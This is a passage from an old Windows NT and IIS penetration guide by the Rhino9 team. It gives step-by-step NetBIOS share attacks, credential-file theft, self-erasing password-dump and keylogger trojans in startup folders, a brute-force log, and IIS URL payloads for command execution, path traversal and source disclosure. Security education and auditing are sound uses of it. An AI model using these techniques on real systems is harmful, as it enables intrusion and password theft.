+IUSR_BILLY BOB
+IWAM_BILLY BOB
+IUSR_SPUPPY
+IWAM_SPUPPY
+Local: The Local tool works just as the Global tool does, except it
+queries the machine for the members of a local group instead of a 
+global group. Below is an example of the Local tool querying a server 
+for a list of its Administrators group.
+
+C:\>local "administrators" domain1
+Bob
+Domain Admins
+Bill
+NetDom: NetDom is a tool that will query a server for its role in a domain, 
+as well as querying the machine for its PDC. The NetDom tool also 
+works with an Lmhosts/IPC mapping. Below is a capture of the tool and its
+standard output:
+
+Querying domain information on computer \\SPUPPY ...
+The computer \\SPUPPY is a domain controller of DOMAIN4.
+Searching PDC for domain DOMAIN4 ...
+Found PDC \\SPUPPY
+The computer \\SPUPPY is the PDC of DOMAIN4.
+
+NetWatch: NetWatch is a tool that will give the person invoking the 
+tool a list of the shares on a remote machine. Again, this tool 
+works with an Lmhosts/IPC mapping. The bad thing about this tool 
+is that the Rhino9 team was able to use the tool to retrieve a 
+list of the hidden shares on the remote machine.
+Other known penetration techniques that involve the IPC share 
+include opening the registry of the remote machine, as well as a 
+remote User Manager for Domains technique. The IPC null connection 
+could allow an intruder to potentially gain access to your registry. 
+Once the null IPC session has been established, the intruder would 
+launch his local regedit utility and attempt the 
+Connect Network Registry option. If this is succesful, the intruder 
+would have read access to certain regsitry keys, and potentially read/write. 
+Regardless, even read access to the registry is undesirable from a security standpoint.
+An intruder could also attempt the IPC User Manager for Domains technique.
+This technique is relatively unknown and often times produces no results. 
+We are covering it because it can produce results and it can be an effective
+intrusion technique. This technique involves a null IPC session and entries
+into the LMHOSTS file. The LMHOSTS file is (normally) a local file kept on 
+windows based machines to map NetBIOS names to IP addresses. Used mostly in
+non-WINS environments, or on clients unable to use WINS, the LMHOSTS file 
+can actually be used in many different ways by an intruder. Different uses 
+for the LMHOSTS file will be discussed later in this text, for now we will 
+discuss how the LMHOSTS file is used in this technique.
+
+This is an excellent technique to discuss because it shows how one of 
+the previous techniques is used in conjunction with this one to 
+accomplish a goal. Beginning with a portscan, and assuming that port 139 is open,
+the attacker would issue an nbtstat command. The intruder would then glean 
+the NetBIOS name of the remote machine from the nbtstat results. 
+Lets look at the same sample nbtstat results from above:
+
+C:\>nbtstat -A x.x.x.x
+NetBIOS Remote Machine Name Table
+Name Type Status
+---------------------------------------------
+DATARAT <00> UNIQUE Registered
+R9LABS <00> GROUP Registered
+DATARAT <20> UNIQUE Registered
+DATARAT <03> UNIQUE Registered
+GHOST <03> UNIQUE Registered
+DATARAT <01> UNIQUE Registered
+MAC Address = 00-00-00-00-00-00
+
+By examining the results of the nbtstat command, we are looking for 
+the <03> identifier. If someone is logged on locally on the machine, 
+you will see two <03> identifiers. Normally the first <03> listed is 
+the netbios name of the machine and the second <03> identifier listed 
+is the name of the locally logged on user. At this point the intruder 
+would put the netbios name and ip address mapping of the machine into 
+his local LMHOSTS file, ending the entry with the #PRE and #DOM tags. 
+The #PRE tag denotes that the entry should be preloaded into the netbios cache.
+The #DOM tag denotes domain activity. At this point the intruder would 
+issue a nbtstat -R command to preload the entry into his cache. 
+Technically, this preloading would make the entry appear as if it 
+had been resolved by some previous network function and allow the name 
+to be resolved much quicker.
+
+Next the intruder would establish a null IPC session. Once the null
+IPC session has been succesfully established, the intruder would launch 
+his local copy of User Manager for Domains and use the Select Domain
+function in User Manager. The Domain of the remote machine will appear 
+(or can manually be typed in) because it has been pre-loaded into the cache. 
+If the security of the remote machine is lax, User Manager will display 
+a list of all the users on the remote machine. If this is being done 
+over a slow link (i.e. 28.8 modem) it will normally not work. 
+On faster network connections however, this tends to produce results.
+
+Now that the intruder has gathered information about your machine, 
+the next step would be to actually attempt a penetration of that machine.
+The first penetration technique to be discussed will be the open 
+file share attack. The intruder would couple the previously discussed 
+net view command with a net use command to accomplish this attack.
+
+Taking the net view from above, lets discuss the attack.
+C:\>net view \\0.0.0.0
+Shared resources at \\0.0.0.0
+Share name Type Used as Comment
+-------------------------------------------------------------------------------
+Accelerator Disk Agent Accelerator share for Seagate backup
+Inetpub Disk
+mirc Disk
+NETLOGON Disk Logon server share
+www_pages Disk
+The command completed successfully. 
+Once the attacker has a list of the remote shares, he could then attempt 
+to map to a remote share.
+
+An example of the command structure for the attack would be:
+
+c:\>net use x: \\0.0.0.0\inetpub
+
+This attack will only work if the share is unpassworded or shared out 
+to the everyone group (NOTE: The Everyone group means Everyone. 
+If someone connects as a null user, they are now part of the everyone group.).
+If those parameters are in place, the attacker would be able to map a network 
+drive to your machine and begin what could amount to a severe series of 
+penetration attacks. Keep in mind that the intruder is not limited to 
+mapping drives to the shares displayed by the net view command.
+
+An intruder that knows NT or has done his homework knows that NT has hidden
+administrative shares. By default, NT creates the IPC$ share and one hidden 
+share for every drive on the machine (i.e. a machine that has C, D, and E 
+drives would have corresponding hidden shares of C$, D$, and E$). 
+There is also a hidden ADMIN$ share that maps directly to the installation
+path of NT itself (i.e. If you installed NT on C:\winnt, than ADMIN$ maps 
+to that exact portion of that drive). One thing that the Rhino9 team has 
+noticed about the majority of the NT security community is that they seem 
+to be oblivious to the concept of penetrating one internal NT machine 
+from another internal NT machine. The Rhino9 team, during our professional audits,
+has accomplished this task many times. Chances are, if the intruder is 
+good and can gain access to one of your machines, he will worm his way 
+into the rest of your network. For that reason, these share attacks can 
+pose a serious threat.
+
+(As a side note, the Rhino9 team was once contacted to perform a remote 
+penetration audit for one of the largest ISP's in Florida. 
+We gained access to a share on one of the technician's personal machines,
+and from there gained access to the entire network. It can be done.)
+
+At first, someone may not be able to see the dangers of someone having 
+access to your hard drive. Access to the hard drive opens up new avenues
+for Information Gathering and Trojan/Virus planting. An attacker would 
+normally look for something that could possibly contain a password or 
+highly sensitive data that he could use to continue digging his way 
+into your network. Some of the files that a intruder will look for 
+and use are listed below, each with a brief description of what it is, 
+and how it would be used.
+
+Eudora.ini: This file is used to store configuration information 
+for eudora e-mail software. An easily obtainable tool called eudpass.com
+will extract the individuals username and password information as well 
+as all the information that the attacker needs to begin eavesdropping 
+on the users mail. At this point, the intruder could configure his own 
+e-mail software to read the targets mail. Again, some could have a hard 
+time seeing the dangers in this, but remember that generally, people 
+are creatures of habit. The chances that the user's e-mail password is
+the same password they use to log into the network at work are relatively 
+high. 
+
+Now all the attacker needs to do is keep snooping around on the users hard 
+drive for a resume or some other work related document to point him in 
+the direction of the persons place of business, allowing him to launch 
+a somewhat strong initial strike against the network.
+
+Tree.dat: This is the file that is used by the popular software CuteFTP
+to store the users ftp site/username/password combinations. 
+Using a program called FireFTP, the attacker can easily crack the tree.dat 
+file. So, as above, the user could keep gathering information about you and 
+launch an attack against your place of business. Not to mention that if you 
+have an ftp mapping in your tree.dat that maps directly to your place of 
+business, his attack has now become much easier.
+
+PWL: PWL's generally reside on Win95 machines. They are used to store 
+operation specific passwords for the Windows95 end user. A tool called 
+glide.exe will crack (with less than desirable efficiency) PWL files. 
+There is also documentation available on how to manually crack the 
+encryption of these PWL files using a calculator. Continuing the scenario, 
+the attacker could keep gathering information about the user and formulate 
+an attack.
+
+PWD: PWD files exist on machines running FrontPage or Personal Webserver. 
+These files include the plain text username and an encrypted password
+matching the credentials needed to administer the website. 
+The encryption scheme used for these passwords is the standard DES scheme. 
+Needless to say, many DES cracking utilities are available on the internet. 
+John the Ripper by Solar Designer very efficiently cracks these passwords.
+
+WS_FTP.ini: This ini file exists on machines using ws_ftp software.
+Although an automated password extractor for this file has just 
+recently been introduced into the security community, the encryption 
+mechanism used is not very strong. The password is converted to hex 
+numbers (2 digits). If a digit is at the N position, then N is added 
+to the digit. Reverse the process and you have cracked this encryption scheme.
+(This is also known to sometimes work for cracking PMail.ini - 
+Pegasus Mail and Prefs.js - Netscape.)
+
+IDC Files: IDC (internet database connecter) files are normally used 
+for back-end connectivity to databases from a webserver. Becuase this
+type of connection generally requires authentication, some IDC files 
+contain username/password combinations, often times in clear text.
+
+waruser.dat: This is one of the config files for WarFTP, the popular Win32 FTP server. 
+This particular dat file could contain the administrative password for
+the FTP server itself. From what the authors have been able to find out, 
+this only occurs in beta versions of WarFTP 1.70.
+
+$winnt$.inf: During an unattended installation of WindowsNT, the setup 
+process requires information files. As residue of this unattended 
+installation process, a file called $winnt$.inf could exist in the 
+%systemroot%\system32 directory. This file could contain the username 
+and password combination of the account that was used during the 
+installation. Because the account used in these types of installations 
+normally require some strong permission sets on the network, 
+this is not a trivial matter.
+
+Sam._: Although people have known for a long time that the SAM database 
+could present a problem if it fell into the wrong hands, many people 
+forget about the sam._. 
+
+Many would-be intruders have asked themselves how they could copy 
+the SAM database if they could mount a drive across the net. 
+Well, normally this is not possible, because the NT server you are 
+connected to is running, and while it is running, it locks the SAM. 
+However, if the administrator has created an emergency repair disk, 
+a copy of the SAM should be located in the %systemroot%\repair\ directory. 
+This file will be named sam._. This copy, by default is EVERYONE readable. 
+By using a copy of the samdump utility, you can dump username/password 
+combinations from the copied SAM.
+
+ExchVerify.log: The ExchVerify.log file is created by Cheyenne/Innoculan/ArcServe.
+Normally created by the installation of the Cheyenne/Innoculan/ArcServe 
+software, this file resides at the root of the drive where the software
+installation took place. This file can contain extremely sensitive 
+information, as shown below:
+
+<EXCH-VERIFY>: ExchAuthenticate() called with
+NTServerName:[SAMPLESERVER]
+NTDomainName[SAMPLESERVER] adminMailbox:[administrator]
+adminLoginName:[administrator]
+password:[PASSWORD]
+Needless to say, the file contains information that an intruder could 
+easily use to further compromise the integrity of your network.
+
+Profile.tfm: Profile.tfm is a file that is created by the POP3 client 
+software AcornMail. At the writing of this document, AcornMail began 
+getting alot of attention from the internet community. Upon inspection 
+of the software, we found that it's an efficient POP3 client, but the 
+installation is not NTFS friendly. After the installation of the software, 
+we began to check into the files that AcornMail created. We found that 
+the Profile.tfm file held the username/password combination. 
+At first, we decided the software was somewhat ok, because it did 
+indeed store the password in an encrypted state. We then realized 
+that the permissions on the profile.tfm file were set to Everyone/Full Control.
+This causes problems because anyone could obtain a copy of the file 
+and plug this file into their own AcornMail installation. Then intruder 
+coud log on with the stored information. Below is a capture in 
+Network Monitor of just that.
+
+00000000 00 01 70 4C 67 80 98 ED A1 00 01 01 08 00 45 00 ..pLg.........E.
+00000010 00 4A EA A7 40 00 3D 06 14 88 CF 62 C0 53 D1 36 .J..@.=....b.S.6
+00000020 DD 91 00 6E 04 44 F6 1E 84 D6 00 32 51 EB 50 18 ...n.D.....2Q.P.
+00000030 22 38 64 9E 00 00 2B 4F 4B 20 50 61 73 73 77 6F "8d...+OK.Passwo
+00000040 72 64 20 72 65 71 75 69 72 65 64 20 66 6F 72 20 rd.required.for.
+00000050 68 6B 69 72 6B 2E 0D 0A jjohn... 
+00000000 98 ED A1 00 01 01 00 01 70 4C 67 80 08 00 45 00 ........pLg...E.
+00000010 00 36 A4 02 40 00 80 06 18 41 D1 36 DD 91 CF 62 .6..@....A.6...b
+00000020 C0 53 04 44 00 6E 00 32 51 EB F6 1E 84 F8 50 18 .S.D.n.2Q.....P.
+00000030 21 AC 99 90 00 00 50 41 53 53 20 67 68 6F 73 74 !.....PASS.xerox
+00000040 37 33 0D 0A 63.. 
+
+As you can see, the username/password is indeed passed in clear text.
+This is not a fault of AcornMail, but something that has been present 
+in the POPvX. This 'data' file swapping/packet sniffing type of 
+technique has been tested by the Rhino9 team on numerous software titles,
+so this attack is not limited to AcornMail.
+
+Now that we have discussed the files an intruder may wish to acquire 
+if he gains access to your hard drive, lets discuss Trojan planting. 
+If there is one thing that can gain an attacker a ton of information, 
+it is trojan planting. The open file share attack generally makes trojan 
+planting extremely easy to do. One of the easiest and most informative 
+trojans to use is the PWDUMP utility wrapped in a batch file. 
+
+If prepared correctly, the batch file will execute minimized 
+(also named something clever, such as viruscan.cmd), run the PWDUMP utility,
+delete the PWDUMP utility after it has run its course, and finally erase itself.
+This generally leaves little evidence and will create a nice text file 
+of all of the username/password combinations on that machine. 
+
+Rules of the trick: The target must be an NT machine and the end 
+user executing the trojan must be the administrator, so the attacker 
+drops the batch file into the Administrators start-up folder and waits. 
+The next time the Administrator logs in to the machine, 
+the batch file executes and dumps the username/password combinations.
+Then the attacker connects back into the machine via file sharing 
+and collects the results.
+
+Another solid attack an intruder might try is to place a keylogger 
+batch into the start-up folder. This can usually be done to any user, 
+not just the administrator. This will glean all keystrokes issued by 
+that user, minus initial logon credentials (due to the NT architecture, 
+which stops all user mode processes during login). The attacker then 
+connects back to the target machine at a later time and collects the 
+recorded keystrokes.
+
+One of the deadliest trojan attacks issued is a batch file that runs as
+Administrator and sets up a scheduled event using the AT command. 
+Because the AT command can execute as System, it can create copies of 
+the SAM database and the registry. Imagine the fun an attacker can 
+have with that one.
+
+How does one prevent such attacks? By not sharing items to the 
+everyone group, and by enforcing strong password schemes in your
+environment. If an intruder comes across a server that prompts him 
+for credentials at every turn, chances are the intruder will become 
+frustrated and leave. Other, more persistant intruders, will continue 
+on with a Brute Force Attack.
+
+Undoubtedly the most common tool for Brute Force NetBIOS attacks is NAT. 
+The NAT (NetBIOS Auditing Tool) tool will allow a user to automate 
+network connection commands using a list of possible usernames and 
+passwords. NAT will attempt to connect to the remote machine using 
+every username and every password in the lists provided. 
+This can be a lengthy process, but often times an attacker will use 
+a shortened list of common passwords and call it quits. 
+
+An accomplished intruder will construct his list of usernames by using
+the information gathering techniques discussed above. The password 
+list the intruder will use will also be constructed from gleaned information.
+Starting with a bare bones list of passwords, and creating the rest 
+based on the usernames. It comes as no surprise to security professionals 
+to find passwords set to the username.
+
+An attacker can specify an IP addresses to attack or he can specify 
+an entire range of IP addresses. NAT will diligently work to accomplish 
+the task, all the while generating a formatted report.
+
+Below is an actual results file of a real NAT attack across the internet.
+Although permission was given for the Rhino9 team to perform this attack,
+the IP address has been changed to protect the test target.
+
+[*]--- Reading usernames from userlist.txt
+[*]--- Reading passwords from passlist.txt
+[*]--- Checking host: 0.0.0.0
+[*]--- Obtaining list of remote NetBIOS names
+[*]--- Attempting to connect with name: *
+[*]--- Unable to connect
+[*]--- Attempting to connect with name: *SMBSERVER
+[*]--- CONNECTED with name: *SMBSERVER
+[*]--- Attempting to connect with protocol: MICROSOFT NETWORKS 1.03
+[*]--- Server time is Tue Oct 14 11:33:46 1997
+[*]--- Timezone is UTC-4.0
+[*]--- Remote server wants us to encrypt, telling it not to
+[*]--- Attempting to connect with name: *SMBSERVER
+[*]--- CONNECTED with name: *SMBSERVER
+[*]--- Attempting to establish session
+[*]--- Was not able to establish session with no password
+[*]--- Attempting to connect with Username: `ADMINISTRATOR' Password: `ADMINISTRATOR'
+[*]--- Attempting to connect with Username: `ADMINISTRATOR' Password: `GUEST'
+[*]--- Attempting to connect with Username: `ADMINISTRATOR' Password: `ROOT'
+[*]--- Attempting to connect with Username: `ADMINISTRATOR' Password: `ADMIN'
+[*]--- Attempting to connect with Username: `ADMINISTRATOR' Password: `PASSWORD'
+[*]--- CONNECTED: Username: `ADMINISTRATOR' Password: `PASSWORD'
+[*]--- Obtained server information:
+Server=[AENEMA] User=[] Workgroup=[STATICA] Domain=[]
+[*]--- Obtained listing of shares:
+Sharename Type Comment
+--------- ---- -------
+ADMIN$ Disk: Remote Admin
+C$ Disk: Default share
+D$ Disk: Default share
+E$ Disk: Default share
+HPLaser4 Printer: HP LaserJet 4Si
+IPC$ IPC: Remote IPC
+NETLOGON Disk: Logon server share 
+print$ Disk: Printer Drivers
+[*]--- This machine has a browse list:
+Server Comment
+--------- -------
+AENEMA 
+[*]--- Attempting to access share: \\*SMBSERVER\
+[*]--- Unable to access
+[*]--- Attempting to access share: \\*SMBSERVER\ADMIN$
+[*]--- WARNING: Able to access share: \\*SMBSERVER\ADMIN$
+[*]--- Checking write access in: \\*SMBSERVER\ADMIN$
+[*]--- WARNING: Directory is writeable: \\*SMBSERVER\ADMIN$
+[*]--- Attempting to exercise .. bug on: \\*SMBSERVER\ADMIN$
+[*]--- Attempting to access share: \\*SMBSERVER\C$
+[*]--- WARNING: Able to access share: \\*SMBSERVER\C$
+[*]--- Checking write access in: \\*SMBSERVER\C$
+[*]--- WARNING: Directory is writeable: \\*SMBSERVER\C$
+[*]--- Attempting to exercise .. bug on: \\*SMBSERVER\C$
+[*]--- Attempting to access share: \\*SMBSERVER\D$
+[*]--- WARNING: Able to access share: \\*SMBSERVER\D$
+[*]--- Checking write access in: \\*SMBSERVER\D$
+[*]--- WARNING: Directory is writeable: \\*SMBSERVER\D$
+[*]--- Attempting to exercise .. bug on: \\*SMBSERVER\D$
+[*]--- Attempting to access share: \\*SMBSERVER\E$
+[*]--- WARNING: Able to access share: \\*SMBSERVER\E$
+[*]--- Checking write access in: \\*SMBSERVER\E$
+[*]--- WARNING: Directory is writeable: \\*SMBSERVER\E$
+[*]--- Attempting to exercise .. bug on: \\*SMBSERVER\E$
+[*]--- Attempting to access share: \\*SMBSERVER\NETLOGON
+[*]--- WARNING: Able to access share: \\*SMBSERVER\NETLOGON
+[*]--- Checking write access in: \\*SMBSERVER\NETLOGON
+[*]--- Attempting to exercise .. bug on: \\*SMBSERVER\NETLOGON
+[*]--- Attempting to access share: \\*SMBSERVER\print$
+[*]--- WARNING: Able to access share: \\*SMBSERVER\print$
+[*]--- Checking write access in: \\*SMBSERVER\print$
+[*]--- WARNING: Directory is writeable: \\*SMBSERVER\print$
+[*]--- Attempting to exercise .. bug on: \\*SMBSERVER\print$
+[*]--- Attempting to access share: \\*SMBSERVER\ROOT
+[*]--- Unable to access
+[*]--- Attempting to access share: \\*SMBSERVER\WINNT$
+[*]--- Unable to access
+If you look closely at the results, you can clearly see the CONNECTED
+ message which informs the attacker that the tool found a valid 
+Username/Password combination. At this point, the intruder would just 
+manually re-connect to that machine using the newly found username/password 
+combination and launch his attack.
+
+This is the end of the remote penetration via NetBIOS section. 
+Keep in mind that the techniques discussed above are neither static
+nor stand-alone. An intruder who has spent time learning how to 
+penetrate NT based networks will become extremely creative and use
+not only the techniques above, but personal variations of those techniques.
+
+===================================================================
+INFORMATION GATHERING AND PENETRATION VIA WEBSERVER
+===================================================================
+
+Information gathering and remote penetration via a webserver is 
+well known today due to the population explosion on the internet
+and the resulting dissemenation of information. When discussing 
+remote penetration and information gathering on NT Webservers, 
+we will focus on Internet Information Server, the webserver that 
+comes bundled with NT4.
+Some of the information to be discussed will be somewhat outdated. 
+We have included it due to the fact that during professional audits, 
+the Rhino9 Team has come across companies that are still running 
+older versions of software titles in their production environments.
+Lets begin by discussing information gathering techniques. 
+We will discuss ways of getting information about the webserver 
+under attack, as well as using the webserver to get information
+that could be used in other types of attacks.
+
+First we will discuss how one would retrieve the webserver software
+package and version on the target machine. Someone that is new to 
+the security community might wonder why one would want the webserver
+version of the target machine. Every different version and 
+distribution of software has different vulnerabilities attached to 
+them. For this reason, an intruder would want to know the webserver 
+software and version in question.
+
+The oldest technique used to acquire webserver software and version 
+is to telnet to the target machine on the HTTP port.
+Once a telnet connection has been established, issuing a simple GET 
+command would allow one to view the HTTP header information, 
+which would include the webserver software and version being used.
+
+One who is not prone to using telnet, or does not wish to parse through
+the header information can use a couple of available tools. 
+The first, and probably most popular tool amongst non-accomplished 
+intruders is Netcraft. An intruder can visit www.netcraft.com and use 
+their query engine to retrieve the webserver information from the remote 
+target. Netcraft can also be used retrieve all known webserver hostnames. 
+For example, if we wanted to find all of the webservers that belong to 
+the someserver.com domain, we could use Netcraft's engine to 
+query *.someserver.com, and it would return a listing of all 
+of the webserver hosts in that domain. Other tools that can be 
+used to retrieve webserver version include 1nf0ze by su1d and 
+Grinder by horizon of Rhino9 (URLs to all tools discussed in 
+this text can be found at the end of this document).
+
+Once the intruder has determined what webserver package he is up
+against, he can begin to formulate an attack plan. By using the 
+techniques discussed below, the intruder could gain access to 
+the server or gain information from the server to use in other attacks. 
+Understand that this section is in no way a complete representation
+of all attacks, just the more common and well known ones.
+
+The first attack to be covered is the .bat/.cmd flaw. As this flaw
+was well documented with its public posting, it will be quoted 
+below (author unknown, if the author is reading this, let me know 
+so that proper credit can be given):
+
+<Quote>
+The .bat and .cmd BUG is a well-known bug in Netscape server and 
+described in the WWW security FAQ Q59. The implementation of 
+this bug in Internet Information Server beats all scores.
+
+Let's consider fresh IIS Web server installation where all settings are default:
+
+1) CGI directory is /scripts
+
+2) There are no files abracadabra.bat or abracadabra.cmd in
+the /scripts directory.
+
+3) IIS Web server maps .bat and .cmd extensions to cmd.exe.
+Therefore registry key
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W3SVC\Parameters\ScriptMap
+has the following string:
+.bat or .cmd=C:\WINNT35\System32\cmd.exe /c %s %s
+In this case a hacker with a malicious intent can send either one 
+of the two command lines to the server:
+
+a) /scripts/abracadabra.bat?&dir+c:\+?&time
+
+b) /scripts/abracadabra.cmd?&dir+c:\+?&time
+
+and the following happens:
+
+1) Browser asks how you want to save a document. Notepad.exe
+or any other viewer would do for this "type" of
+application.
+
+2) Browser starts the download session. The download window
+appears on the screen.
+
+3) The hacker clicks the "cancel" button on the download
+window, because the "time" command on the server never
+terminates.
+
+4) Nothing is logged on the server side by the IIS Web
+server, because the execution process was not successfully
+terminated!!! (Thanks to the "time" command.) The only
+way to see that something happened is to review all your
+NT security logs. But they do not contain information
+like REMOTE_IP. Thus the hacker's machine remains fully
+anonymous.
+Let's resume:
+
+1) IIS Web server allows a hacker to execute his "batch file"
+by typing
+/scripts/abracadabra.bat?&COMMAND1+?&COMMAND2+?&...+?&COMMANDN
+In a similar situation with the Netscape server, only
+single command can be executed.
+
+2) There is no file abracadabra.bat in /scripts directory,
+but .bat extension is mapped to C:\WINNT35\System32\cmd.exe
+In a similar situation with the Netscape server, actual
+.bat file must exist.
+
+3) In case a hacker enters a command like "time" or "date" as
+COMMAND[N], nothing will be logged by IIS Web server.
+In a similar situation with the Netscape server, the error
+log will have a record about remote IP and command you
+trying to execute.
+
+<End Quote>
+
+If you are having trouble seeing exactly what is going on in 
+this situation, an intruder could use the above attack sequence 
+to create and execute files server side. This could have 
+really drastic results depending on the skill level and intent
+of the attacker. Luckily, most production environments are no 
+longer running versions of Internet Information Server old 
+enough to still be affected by this flaw.
+
+Shortly after the bat/cmd flaw was fully investigated and 
+documented, another bug hit the community. Again, lucky for us 
+this flaw also only affects older version of Internet Information
+Server. This flaw, called the 'double dot bug' gave the visitor 
+to the website the ability to break out of the sanctioned
+webroot directory and browse or download files. Obviously 
+the end server could contain sensitive information that 
+exists outside of the designated webroot, and this simple
+flaw would give an outsider access to that information. 
+The command is executed as a URL, and its structure is as
+follows:
+
+http://www.someserver.com/..\..
+
+As if the double dot bug was not enough, another variant on 
+that flaw appeared shortly after. This newly found flaw 
+would give an intruder the ability to execute scripts on the 
+target machine. Due to the fact that this new flaw is a variant
+of the double dot bug, the scripts in question could exist 
+outside of the webroot. This attack is also structured as a 
+URL, and is issued as follows:
+
+http://www.someserver.com/scripts..\..\scriptname
+
+WindowsNT installations of Internet Information Server require 
+some type of account to be used for authentication on the box
+for public visits. If this account was not present in some fashion,
+every visitor to the site would be required to present credentials.
+This would not be a very effective or efficient way to present a
+public website. On Internet Information Server, the account to 
+be used is the IUSR_<computername> account. This account and 
+its accompanying password are created during installation. 
+By default, this account is a member of the everyone group, 
+and by default the everyone group has read access to everything 
+on an NT drive. This fact coupled with the above mentioned 
+flaw's ability to break out of the webroot could lead to 
+major security breaches.
+
+For a short while, it seemed that new URL related attack 
+types seemed to pop up every week. Following the scripts 
+flaw above was another script related bug that would allow 
+an intruder to create a file on the target machine, 
+and possibly execute the file after creation. 
+The new attack URL structure was:
+
+http://www.someserver.com/scripts/script_name%0A%0D>PATH\target.bat
+
+When this flaw first appeared, many people in the community 
+ignored it and gave it no serious thought. Soon after, 
+a public release was made documenting the exact steps an 
+intruder would take to obtain a copy of the repair SAM. 
+The release including the above URL flaw as part of its overall attack. 
+
+When Microsoft released Internet Information Server 3.0, 
+it brought active server page technology to the world. 
+This release also opened the gates to a new stream of flaws
+that affected IIS and NT4.
+
+Active server pages brought simple, dynamic webpages to the 
+Microsoft world. Active Server Pages can be used in many 
+different ways, such as database connectivity, indexing and 
+searching documents, authentication, and simple graphics 
+rotation for those annoying advertisement banners.
+
+The concept of active server pages was actually pretty creative.
+The HTML code would include imbedded script code that would 
+execute server side and produce dynamic content for the end user.
+With this new technology widely available, it was not long until
+the first flaw was released to the public. 
+This first flaw, dubbed the 'dot flaw', would allow an intruder 
+to actually view the script without the server executing it.
+
+A standard URL structure would look like this:
+http://www.genericserverhere.com/default.asp
+The attack URL structure would look like this:
+http://www.genericserverhere.com/default.asp.
+
+This attack would display the unexecuted code in the attackers web browser. 
+Needless to say, the script code could contain sensitive information,
+such as a username/password combination to remotely connect to a database. 
+This type of information, among other things, is not something that 
+one would want an intruder getting their hands on.
+
+When a fix was released for the dot flaw, variants of the flaw that 
+defeated the fix were also released. 
+The first of the variants was the %2e flaw. %2e is the hex equivelant
+of a period, thus showing that the fix that was made available
+was not incredibly robust. Variants of this flaw continue to 
+show up on occasion. Because all of the variants perform the 
+same exact end results, they will not be discussed in detail.
+Some of the known attack URL structures are listed below:
+
+http://www.someserver.com/default%2easp
+http://www.someserver.com/default%2e%41sp
+http://www.someserver.com/default.asp::$DATA
+http://www.someserver.com/shtml.dll?<filename>.asp
+
+Everyone involved in the security community has a feeling that 
+these will not be the last script displaying methods to emerge 
+in the near future. As these scripts become more and more
+commonplace, they will contain more and more sensitive information.
+These simple exploits could lead to an intruder easily gleaning
+sensitive information. When it comes to gleaning information 
+from IIS, perhaps one of the most popular and easiest of the attacks
+is the Index Server attack. Index Server is a small compact search 
+engine module that was included with Internet Information Server 
+version 3.0. This module gives webmasters the ability to provide
+visitors to their site with a searchable interface for searching 
+the contents of the website. Although there are no inherent problems 
+with Index Server itself, problems arise out of a lack of education 
+on the part of the admin or webmaster. Index Server is not difficult
+to understand, setup and mantain, although its use of catalogs and 
+scopes can lead to an admin misconfiguring the permissions and searchable content.
+This misconfiguration could lead to an intruder gaining access to 
+information he would normally have a much more difficult time getting.
+
+The default URL structure for this attack would be:
+http://www.someserver.com/samples/search/queryhit.htm
+
+This path reflects the default path to the sample pages that ship 
+with Internet Information Server. If this path is not a valid path,
+the intruder could still click on that helpful little "Search This Site" 
+link to access the same information. Once the intruder successfully 
+reaches the html document in question, he will be presented with a 
+webpage containing a form field. This form field is where a visitor
+to your site would normally input the information he wished to search for.
+
+An intruder could use a filename search string such as:
+#filename=*.txt
+
+This would instruct Index Server to search through its catalog of
+indexed data for any files ending with that file extension.
+Keep in mind that this file extension is not limited to extensions 
+that Index Server understands. If Index Server encounters a file 
+type it does not understand, it will treat it as a binary and index 
+the filename, extensions, date, and other attributes. This means that 
+an intruder could search for anything, including *._, which could 
+bring up the repair sam. The interesting thing about Index Server is 
+that unlike other full blown internet search engines, Index Server will 
+not display a file for which the requester does not have permission to 
+access. In other words, if Index Server returns the fact that it found 
+a file, then the file is accessable.
+
+Another favorite default function an intruder would attempt to access 
+is Internet Information Servers web admin interface. 
+In a default installation of IIS, the web admin interface resides 
+in the 'iisadmin' sub directory of the web root, which means 
+the URL attack structure would be:
+
+http://www.someserver.com/iisadmin
+
+If the admin has somehow misconfigured the permissions on this interface,
+then an intruder could gain unauthorized access to the web server with 
+administrative functions. If successful, the intruder would be presented 
+with an HTML interface to an administrative tool. Because of the way IIS 
+and NT handles permissions, it is possible for the intruder to gain access 
+to the interface but not have the proper permissions to actually do 
+anything with it. So if you are auditing your own network, be sure to 
+attempt a minor change to ensure that there is a problem.
+
+In late '97 and early '98 an enormous amount of webserver hacks were performed. 
+A large number of those hacks had one thing in common: the 
+webservers were running Microsoft Frontpage Extensions. Frontpage Extensions
+are little 'web bots', if you will, that allow the author or administrator 
+of the website to perform complex or involved tasks with relative ease.
+
+The problem with the Frontpage Extensions was that a default Frontpage installation
+was not secure, especially in the unix version. An alarming number of the 
+servers supporting these extensions had been left unpassworded or enabled 
+administrative rights to the Everyone group. Again, the everyone group
+means everyone, including anonymous connections.
+
+We will dive into the first Frontpage attack with a discussion of an attack 
+using the actual Frontpage client software.
+
+A server that supports FrontPage will have a number of working directories
+that begin with the letters '_vti'. Doing a search at any of the popular
+search engines for any of the default frontpage directories would result 
+in a large number of returns from the engine. An intruder could then get 
+comfortable and attempt a simple, repetative attack against these servers. 
+
+The attack is executed as follows:
+
+1- Open your own personal copy of FrontPage
+2- Goto the "Open frontpage web" dialogue box
+3- Put in the URL or IP of the server you wish to attack
+
+If the server is unpassworded or if permission is granted to the everyone group, 
+Frontpage will open the remote site for you, and allow you to alter it. 
+The attack really is this simple. If the extensions are set up correctly, 
+a username/password dialogue would appear. The intruder may attempt some 
+basic combinations such as administrator/password, but chances are the 
+intruder won't bother, and will move on.
+
+An intruder could also use the same "open frontpage web" trick to get a 
+complete user listing. This could be used in brute force attacks later.
+Documentation circulated explaining that to stop the gleaning of usernames 
+this way, one should create a restriction group as FP_www.yourdomain.com:80. 
+This new restriction group indeed works, unless the intruder uses the
+IP address of your server instead of the domain name.
+
+Some other tricks that can be done with FrontPage support is attempting 
+to grab the Frontpage password file. Frontpage normally stores the password 
+in the _vti_pvt directory, with the name service.pwd. An intruder could 
+attempt to execute the following URL:
+
+http://www.someserver.com/_vti_pvt
+
+If permissions are not setup correctly and directory browsing is allowed, 
+the intruder would get a listing of the files in that directory, 
+including service.pwd. Usually the administrator will pay some attention 
+to the installation and security of the site and restrict access to that 
+directory. Although this is a good initial step, always remember how NTFS works.
+Depending on the configuration of NTFS, a user may still gain access to the 
+password file even though access to the parent folder has been denied. 
+In this type of situation, the intruder would simply issue the full path 
+to the file in the URL, such as:
+
+http://www.someserver.com/_vti_pvt/service.pwd
+
+Although the frontpage password file is encrypted, it is encrypted with 
+standard DES, so any DES cracker can glean it after proper file doctoring. 
